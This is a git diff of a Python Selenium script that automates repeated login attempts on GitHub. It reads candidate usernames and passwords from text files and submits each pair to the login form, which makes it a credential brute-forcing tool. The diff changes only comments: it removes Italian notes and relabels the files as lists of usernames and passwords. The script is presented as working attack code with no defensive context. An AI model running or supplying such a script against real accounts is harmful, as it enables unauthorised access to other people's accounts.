@@ -13,13 +13,11 @@ driver = webdriver.Chrome(path)
 url = "https://github.com/login"
 # Opening the URL
 driver.get(url)
-#your username and password to login
+#usernames to login
 with open('username.txt', 'r') as file1:
-    # Leggi tutte le parole nel file e mettile in una lista
     users = file1.read().split()
-#your username and password to login into GitHub account
+#passwords to login
 with open('password.txt', 'r') as file2:
-    #Leggi tutte le parole nel file e mettile in una lista
     passw = file2.read().split()
 for username in users:
     # finding username input field by find_element by id and pass username
@@ -31,6 +29,6 @@ for username in users:
         driver.find_element("name","commit").click()
         sleep(5)
 
-
+#avoid automatic closing of web page
 sleep(100)
 driver.close()
